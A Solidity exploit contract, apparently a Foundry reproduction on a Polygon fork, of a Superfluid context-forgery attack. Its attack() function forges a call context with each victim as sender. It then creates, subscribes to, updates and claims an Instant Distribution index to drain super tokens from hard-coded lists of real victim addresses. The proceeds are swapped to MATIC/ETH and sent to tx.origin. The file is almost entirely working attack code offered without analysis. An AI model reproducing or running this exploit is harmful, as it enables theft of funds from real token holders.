// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// import "forge-std/Test.sol";
import "../HarvestFF/interfaces/IERC20.sol";
import "../HarvestFF/interfaces/IUniswapV2Router02.sol";
import "../HarvestFF/interfaces/IFlashLoanReceiver.sol";

interface ISuperfluid {
    function callAgreement(
         address agreementClass,
         bytes calldata callData,
         bytes calldata userData
     )
        external
        returns (bytes memory returnedData);
}

interface IInstantDistributionAgreementV1 {
    function createIndex(
        address token,
        uint32 indexId,
        bytes calldata ctx)
            external
            returns(bytes memory newCtx);

     function updateIndex(
        address token,
        uint32 indexId,
        uint128 indexValue,
        bytes calldata ctx)
            external
            returns(bytes memory newCtx);

    function updateSubscription(
        address token,
        uint32 indexId,
        address subscriber,
        uint128 units,
        bytes calldata ctx)
            external
            returns(bytes memory newCtx);

    function claim(
        address token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes calldata ctx)
        external
        returns(bytes memory newCtx);
}

interface ISuperToken is IERC20 {
    function downgrade(uint256 amount) external;
}

interface ISETHCustom is ISuperToken {
    // using native token
    function upgradeByETH() external payable;
    function upgradeByETHTo(address to) external payable;
    function downgradeToETH(uint wad) external;
}


library ContextDefinitions {
    // app level
    uint256 constant internal CALL_INFO_APP_LEVEL_MASK = 0xFF;

    // call type
    uint256 constant internal CALL_INFO_CALL_TYPE_SHIFT = 32;
    uint256 constant internal CALL_INFO_CALL_TYPE_MASK = 0xF << CALL_INFO_CALL_TYPE_SHIFT;
    uint8 constant internal CALL_INFO_CALL_TYPE_AGREEMENT = 1;
    uint8 constant internal CALL_INFO_CALL_TYPE_APP_ACTION = 2;
    uint8 constant internal CALL_INFO_CALL_TYPE_APP_CALLBACK = 3;

    function decodeCallInfo(uint256 callInfo)
        internal pure
        returns (uint8 appLevel, uint8 callType)
    {
        appLevel = uint8(callInfo & CALL_INFO_APP_LEVEL_MASK);
        callType = uint8((callInfo & CALL_INFO_CALL_TYPE_MASK) >> CALL_INFO_CALL_TYPE_SHIFT);
    }

    function encodeCallInfo(uint8 appLevel, uint8 callType)
        internal pure
        returns (uint256 callInfo)
    {
        return uint256(appLevel) | (uint256(callType) << CALL_INFO_CALL_TYPE_SHIFT);
    }

}


interface UniSwapV2 {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Pair {
    function swap(
    uint256 amount0Out,
    uint256 amount1Out,
    address to,
    bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
}

interface IUSDT {
    function approve(address _spender, uint256 _value) external;
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address _to, uint256 _value) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transferFrom(address sender, address recipient, uint256 amount) external;
    function transfer(address recipient, uint256 amount) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IWMATIC  {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transferFrom(address sender, address recipient, uint256 amount) external;
    function transfer(address recipient, uint256 amount) external;
}

// curve ?
// def remove_liquidity(amount: uint256, min_amounts: uint256[N_COINS]): nonpayable
// def remove_liquidity_one_coin(token_amount: uint256, i: uint256, min_amount: uint256): nonpayable
interface ICurveCryptoSwap {
    function remove_liquidity(uint256 amount, uint256[] calldata min_amounts) external;
    function remove_liquidity_one_coin(uint256 token_amount, int128 i, uint256 min_amount) external;
 
}



// eth_rpc_url = "https://rpc.ankr.com/polygon"
// fork_block_number = 24684668
// contract ExploitTest is Test{
contract ExploitTest {
    event Eat(address indexed token, uint256 amount);

    ISuperfluid superfluid = ISuperfluid(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
    IInstantDistributionAgreementV1 ida = IInstantDistributionAgreementV1(0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1);
    ISuperToken superusdc = ISuperToken(0xCAa7349CEA390F89641fe306D93591f87595dc1F);
    ISETHCustom supereth = ISETHCustom(0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3);
    IERC20 usdc = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    IERC20 USDT = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);
    IERC20 WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);
    IERC20 WMATIC = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
    IERC20 SUPERQIDAO = IERC20(0xe1cA10e6a10c0F72B74dF6b7339912BaBfB1f8B5);
    IERC20 SUPERMOCA = IERC20(0x1ADcA32B906883e474aEbcBA5708B41F3645f941);
    IERC20 SUPERSDAM3CRV = IERC20(0x8ef4F0C0753048a39B4Bc4eB3f545Fdae00618B7);

    // IERC20 SUPERSTAK = IERC20(0xcAE73e9EeE8a01b8B7F94b59133e3821F21470AB);
    // IERC20 STAK = IERC20(0xccBe9B810d6574701d324fD6DbE0A1b68f9d5bf7);

    IERC20 SDAM3CRV = IERC20(0x7d60F21072b585351dFd5E8b17109458D97ec120);
    IERC20 QIDAO = IERC20(0x580A84C73811E1839F75d86d75d88cCa0c241fF4);
    IERC20 MOCA = IERC20(0xcE899f26928a2B21c6a2Fddd393EF37c61dbA918);
    // IERC20 UCHILD = IERC20(0xC7688ecFDd75C70695E11e33Ea68F4a105F9716a);

    IERC20 YCURVE = IERC20(0xE7a24EF0C5e95Ffb0f6684b813A78F2a3AD7D171);
    IERC20 MAI = IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1);
    // ICurveCryptoSwap CURVESWAP = ICurveCryptoSwap(0x1d8b86e3D88cDb2d34688e87E72F388Cb541B7C8);
    
    

    IUniswapV2Factory public constant uniswapV2Factory = IUniswapV2Factory(0x5757371414417b8C6CAad45bAeF941aBc7d3Ab32); // Uniswap V2 Factory 주소

    address private constant UNISWAP_ROUTER = 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff;
    // IUniswapV2Pair private pair;
    // IUniswapV2Pair private pairQIDAO;
    // IUniswapV2Pair private pairMOCA;
    // // IUniswapV2Pair private pairSTAK;
    // IUniswapV2Pair private pairYCURVE;
    // IUniswapV2Pair private pairMAI;

    IUniswapV2Router02 public uniswapRouter;

    address[] public victims = [
        0x6AEAeE5Fd4D05A741723D752D30EE4D72690A8f7,
        0x1EB3FAA360bF1f093F5A18d21f21f13D769d044A,
        0x5073c1535A1a238E7c7438c553F1a2BaAC366cEE,
        0xe6116AA08e14afE08A9A563E9ef6cCd5b47070B7,
        0x0154d25120Ed20A516fE43991702e7463c5A6F6e,
        0x6583f33895B538DFdeeE234F2D34dF1033655de1,
        0xe44257ec3c1767074f9d0A648073Eb1e6D369f8a,
        0x2e9e3C24049655f2D8C59f08602Da3DE4aD34188,
        0x81Ea02098336435d5e92e032C029AAB850304f5D,
        0xA08f80dc1759b12fdC40A4dc64562b322C418E1f,
        0xD6Fb1f82FF2296b55bddfFcCe80ABde7fbC6c22d,
        0x39b7B5fb06C4B24D8758306774D7340dC694320A,
        0x8393183E7217D982A698682a3F620ae6957f6F2d,
        0x2Af4AE1226f28A1a3bc239b96e16291EF4fDD57d,
        0xAF8b668bfC2aD9457c03c2989C7816b5cbe2185c,
        0x0C3483e3B355986D6Bb76E3CEbBC8dD8EC20779C,
        0xf7f0CFC3772d29d4CC1482A2ACB7Be16a85a2223,
        0x87a4b3E26D17C88C8E22B605bb211f3b92c659F4,
        0x290a27026021af22b1794Dc1e489A35869820637,
        0xdf924446d08C642E0B1Df15089E2ab87f737a544,
        0x7749e869B88A3C45b40F8C257E0bB36981b8262f,
        0xc78131beAdF917DFa2aCE8fAf49eA88Ada7c4bD0
    ];
    // superUSDc
    address[] public victims_usdc = [
        0x6AEAeE5Fd4D05A741723D752D30EE4D72690A8f7,
        0x6583f33895B538DFdeeE234F2D34dF1033655de1,
        0xe44257ec3c1767074f9d0A648073Eb1e6D369f8a,
        0x1EB3FAA360bF1f093F5A18d21f21f13D769d044A,
        0x2e9e3C24049655f2D8C59f08602Da3DE4aD34188,
        0x81Ea02098336435d5e92e032C029AAB850304f5D,
        0xA08f80dc1759b12fdC40A4dc64562b322C418E1f,
        0x2Af4AE1226f28A1a3bc239b96e16291EF4fDD57d,
        0xAF8b668bfC2aD9457c03c2989C7816b5cbe2185c,
        0x0C3483e3B355986D6Bb76E3CEbBC8dD8EC20779C,
        0xf7f0CFC3772d29d4CC1482A2ACB7Be16a85a2223,
        0x87a4b3E26D17C88C8E22B605bb211f3b92c659F4,
        0x290a27026021af22b1794Dc1e489A35869820637,
        0xdf924446d08C642E0B1Df15089E2ab87f737a544
    ];

    address[] public victims_eth = [
        0x6AEAeE5Fd4D05A741723D752D30EE4D72690A8f7,
        0x1EB3FAA360bF1f093F5A18d21f21f13D769d044A
    ];


    address[] public victims_sdam3CRV = [
        0x6AEAeE5Fd4D05A741723D752D30EE4D72690A8f7,
        0x1EB3FAA360bF1f093F5A18d21f21f13D769d044A,
        0x7749e869B88A3C45b40F8C257E0bB36981b8262f,
        0xD6Fb1f82FF2296b55bddfFcCe80ABde7fbC6c22d,
        0xc78131beAdF917DFa2aCE8fAf49eA88Ada7c4bD0
    ];

    address[] public victims_stak = [
        0x8393183E7217D982A698682a3F620ae6957f6F2d,
        0xAF8b668bfC2aD9457c03c2989C7816b5cbe2185c
    ];

    address[] public victims_qi = [
        0x6AEAeE5Fd4D05A741723D752D30EE4D72690A8f7,
        0x1EB3FAA360bF1f093F5A18d21f21f13D769d044A,
        0x5073c1535A1a238E7c7438c553F1a2BaAC366cEE,
        0xe6116AA08e14afE08A9A563E9ef6cCd5b47070B7
    ];

    address[] public victims_mooca = [
        0x6AEAeE5Fd4D05A741723D752D30EE4D72690A8f7,
        0x39b7B5fb06C4B24D8758306774D7340dC694320A
    ];

    // function run() public {
    //     testExploit();
    // }
    function uniswapSwap(uint256 _amountIn) public {
        // Approve transfer of USDC token to uniswapRouter
        usdc.approve(address(uniswapRouter), _amountIn);
        usdc.approve(address(this), _amountIn);

        // Get current reserves of the USDC-WMATIC
        // (uint256 reserveUSDC, uint256 reserveWETH, ) = pair.getReserves();

        // Calculate the amount of WETH to receive
        // uint256 amountOut = uniswapRouter.getAmountOut(_amountIn, reserveUSDC, reserveWETH);

        // Swap USDC for WETH
        address[] memory path = new address[](2);
        path[0] = address(usdc);
        path[1] = address(WMATIC);
        uniswapRouter.swapExactTokensForTokens(_amountIn, 0, path, address(this), block.timestamp);
    }

    function uniswapSwapQIDAO(uint256 _amountIn) public {
        // Approve transfer of USDC token to uniswapRouter
        QIDAO.approve(address(uniswapRouter), _amountIn);
        QIDAO.approve(address(this), _amountIn);

        // Get current reserves of the USDC-WMATIC
        // (uint256 reserveUSDC, uint256 reserveWETH, ) = pairQIDAO.getReserves();

        // Calculate the amount of WETH to receive
        // uint256 amountOut = uniswapRouter.getAmountOut(_amountIn, reserveUSDC, reserveWETH);
        

        // Swap USDC for WETH
        address[] memory path = new address[](2);
        path[0] = address(QIDAO);
        path[1] = address(WMATIC);
        uniswapRouter.swapExactTokensForTokens(_amountIn, 0, path, address(this), block.timestamp);
    }

    function uniswapSwapMOCA(uint256 _amountIn) public {
        // Approve transfer of USDC token to uniswapRouter
        MOCA.approve(address(uniswapRouter), _amountIn);
        MOCA.approve(address(this), _amountIn);

        // Get current reserves of the USDC-WMATIC
        // (uint256 reserveUSDC, uint256 reserveWETH, ) = pairMOCA.getReserves();

        // Calculate the amount of WETH to receive
        // uint256 amountOut = uniswapRouter.getAmountOut(_amountIn, reserveUSDC, reserveWETH);
        

        // Swap USDC for WETH
        address[] memory path = new address[](2);
        path[0] = address(MOCA);
        path[1] = address(WMATIC);
        uniswapRouter.swapExactTokensForTokens(_amountIn, 0, path, address(this), block.timestamp);
    }

    function uniswapSwapYCURVE(uint256 _amountIn) public {
        // Approve transfer of USDC token to uniswapRouter
        YCURVE.approve(address(uniswapRouter), _amountIn);
        YCURVE.approve(address(this), _amountIn);

        // Get current reserves of the USDC-WMATIC
        // (uint256 reserveUSDC, uint256 reserveWETH, ) = pairYCURVE.getReserves();

        // Calculate the amount of WETH to receive
        // uint256 amountOut = uniswapRouter.getAmountOut(_amountIn, reserveUSDC, reserveWETH);
        

        // Swap USDC for WETH
        address[] memory path = new address[](2);
        path[0] = address(YCURVE);
        path[1] = address(MAI);
        uniswapRouter.swapExactTokensForTokens(_amountIn, 0, path, address(this), block.timestamp);
    }

    function uniswapSwapMAI(uint256 _amountIn) public {
        // Approve transfer of USDC token to uniswapRouter
        MAI.approve(address(uniswapRouter), _amountIn);
        MAI.approve(address(this), _amountIn);

        // Get current reserves of the USDC-WMATIC
        // (uint256 reserveUSDC, uint256 reserveWETH, ) = pairYCURVE.getReserves();

        // Calculate the amount of WETH to receive
        // uint256 amountOut = uniswapRouter.getAmountOut(_amountIn, reserveUSDC, reserveWETH);
        

        // Swap USDC for WETH
        address[] memory path = new address[](2);
        path[0] = address(MAI);
        path[1] = address(WMATIC);
        uniswapRouter.swapExactTokensForTokens(_amountIn, 0, path, address(this), block.timestamp);
    }


    // function uniswapSwapSTAK(uint256 _amountIn) public {
    //     // Approve transfer of USDC token to uniswapRouter
    //     STAK.approve(address(uniswapRouter), _amountIn);
    //     STAK.approve(address(this), _amountIn);

    //     // Get current reserves of the USDC-WMATIC
    //     (uint256 reserveUSDC, uint256 reserveWETH, ) = pairSTAK.getReserves();

    //     // Swap USDC for WETH
    //     address[] memory path = new address[](2);
    //     path[0] = address(STAK);
    //     path[1] = address(WMATIC);
    //     uniswapRouter.swapExactTokensForTokens(_amountIn, 0, path, address(this), block.timestamp);
    // }

    constructor() {
        // eth check

        // zer0 address
        payable(address(0)).transfer(address(this).balance);
        // 6354217269363837
        // pair = IUniswapV2Pair(uniswapV2Factory.getPair(address(usdc), address(WMATIC)));
        // pairQIDAO = IUniswapV2Pair(uniswapV2Factory.getPair(address(WMATIC), address(QIDAO)));
        // pairMOCA = IUniswapV2Pair(uniswapV2Factory.getPair(address(WMATIC), address(MOCA)));
        // pairYCURVE = IUniswapV2Pair(uniswapV2Factory.getPair(address(YCURVE), address(MAI)));
        // pairMAI = IUniswapV2Pair(uniswapV2Factory.getPair(address(MAI), address(WMATIC)));
        // pairSTAK = IUniswapV2Pair(uniswapV2Factory.getPair(address(STAK), address(WMATIC)));
        uniswapRouter = IUniswapV2Router02(UNISWAP_ROUTER);
    }

    struct Context {
        // callback level
        uint8 appLevel;
        // type of call
        uint8 callType;
        // the system timestsamp
        uint256 timestamp;
        // The intended message sender for the call
        address msgSender;

        // For callbacks it is used to know which agreement function selector is called
        bytes4 agreementSelector;
        // User provided data for app callbacks
        bytes userData;

        // app allowance granted
        uint256 appAllowanceGranted;
        // app allowance wanted by the app callback
        uint256 appAllowanceWanted;
        // app allowance used, allowing negative values over a callback session
        int256 appAllowanceUsed;
        // app address
        address appAddress;
        // app allowance in super token
        address appAllowanceToken;
    }

    function encodeContext(Context memory context)
        private pure
        returns (bytes memory ctx)
    {
        uint256 callInfo = ContextDefinitions.encodeCallInfo(context.appLevel, context.callType);
        uint256 allowanceIO =
            uint128(context.appAllowanceGranted) |
            (uint256(uint128(context.appAllowanceWanted)) << 128);
        ctx = abi.encode(
            abi.encode(
                callInfo,
                context.timestamp,
                context.msgSender,
                context.agreementSelector,
                context.userData
            ),
            abi.encode(
                allowanceIO,
                context.appAllowanceUsed,
                context.appAddress,
                context.appAllowanceToken
            )
        );
    }

    // function platformBalancCheck(address[] memory targets) public {
    
    //     for (uint256 i = 0; i < targets.length; i++) {
    //         address victim = targets[i];

    //         uint256 eat = EAT.balanceOf(victim);
    //         if (eat > 0) {
    //             // emit Eat(victim, eat);
    //             emit log_address(victim);
    
    //         }
    //     }
    // }

    function attack(address[] memory targets, uint8 branch, address token) public {
        for (uint32 i = 0; i < targets.length;) {
            address victim = targets[i];
            
            Context memory ctx = Context({
                appLevel: 0,
                callType: ContextDefinitions.CALL_INFO_CALL_TYPE_AGREEMENT,
                timestamp: block.timestamp,
                msgSender: victim,
                agreementSelector: 0,
                userData: "",
                appAllowanceGranted: 0,
                appAllowanceWanted: 0,
                appAllowanceUsed: 0,
                appAddress: address(0),
                appAllowanceToken: address(0)
            });

            // uint32 indexId = 0xdeadbeaf + uint32(i);
            uint32 indexId = i;

            // crateIndex(superusdc, indexId, fakeCTx)
            superfluid.callAgreement(
                address(ida),
                abi.encodeWithSelector(
                    IInstantDistributionAgreementV1.createIndex.selector,
                    (token),
                    indexId,
                    encodeContext(ctx),
                    new bytes(0)
                ),
                new bytes(0)
            );

            uint256 units = IERC20(token).balanceOf(victim);
            

            // updateSubscription(ISuperToken(token), indexId, victim, units, fakeCtx)
            superfluid.callAgreement(
                address(ida),
                abi.encodeWithSelector(
                    IInstantDistributionAgreementV1.updateSubscription.selector,
                    (token),
                    indexId,
                    address(this),
                    units,
                    encodeContext(ctx),
                    new bytes(0)
                ),
                new bytes(0)
            );

            
            superfluid.callAgreement(
                address(ida),
                abi.encodeWithSelector(
                    IInstantDistributionAgreementV1.updateIndex.selector,
                    (token),
                    indexId,
                    1,
                    encodeContext(ctx),
                    new bytes(0)
                ),
                new bytes(0)
            );

            superfluid.callAgreement(
                address(ida),
                abi.encodeWithSelector(
                    IInstantDistributionAgreementV1.claim.selector,
                    (token),
                    victim,
                    indexId,
                    address(this),
                    new bytes(0)
                ),
                new bytes(0)
            );

            if (branch == 1) {
                uint _supereth = supereth.balanceOf(address(this));
                supereth.downgradeToETH(_supereth);    
            } else {
                uint _superusdc = IERC20(token).balanceOf(address(this));   
                ISuperToken(token).downgrade(_superusdc);
            }
            unchecked {
                i++;
            }
        }

    }
    function testExploit() public {
        // platformBalancCheck(victims);

        // emit log_named_uint("EOA:WMATIC", IWMATIC(address(WMATIC)).balanceOf(address(this)) / 1e18);
        attack(victims_sdam3CRV, 0, address(SUPERSDAM3CRV));

        // withdraw
        IWMATIC(address(SDAM3CRV)).withdraw(IWMATIC(address(SDAM3CRV)).balanceOf(address(this)));
        uniswapSwapYCURVE(YCURVE.balanceOf(address(this)));
        uniswapSwapMAI(MAI.balanceOf(address(this)));
        
        // emit log_uint(IWMATIC(address(WMATIC)).balanceOf(address(this)));
        // emit log_uint(WMATIC.balanceOf(address(this)));
        // emit log_named_uint("EOA:WMATIC", IWMATIC(address(WMATIC)).balanceOf(address(this)) / 1e18);

        attack(victims_qi, 0, address(SUPERQIDAO));
        attack(victims_mooca, 0, address(SUPERMOCA));
        // attack(victims_stak, 0, address(SUPERSTAK));
        attack(victims_usdc, 0, address(superusdc));
        // uniswapSwapSTAK(STAK.balanceOf(address(this)));

        // uniswapSwapYCURVE(SDAM3CRV.balanceOf(address(this)));
        // // usdc => WETH
        uniswapSwap(usdc.balanceOf(address(this)));                
        uniswapSwapQIDAO(QIDAO.balanceOf(address(this)));
        uniswapSwapMOCA(MOCA.balanceOf(address(this)));

        // emit log_uint(IWMATIC(address(WMATIC)).balanceOf(address(this)));
        // emit log_uint(WMATIC.balanceOf(address(this)));

        IWMATIC(address(WMATIC)).approve(address(this), IWMATIC(address(WMATIC)).balanceOf(address(this)));
        IWMATIC(address(WMATIC)).approve(address(tx.origin), IWMATIC(address(WMATIC)).balanceOf(address(this)));
        
        IWMATIC(address(WMATIC)).withdraw(IWMATIC(address(WMATIC)).balanceOf(address(this)));
        

        // payable(tx.origin).transfer(address(this).balance);

        // branch superETH-ETH? 1:ETH
        attack(victims_eth, 1, address(supereth));
        payable(tx.origin).transfer(address(this).balance);

        // eth, matic check 
        // emit log_named_uint("EOA:ETH Checked", address(tx.origin).balance);
    }
    receive() external payable {} 
}
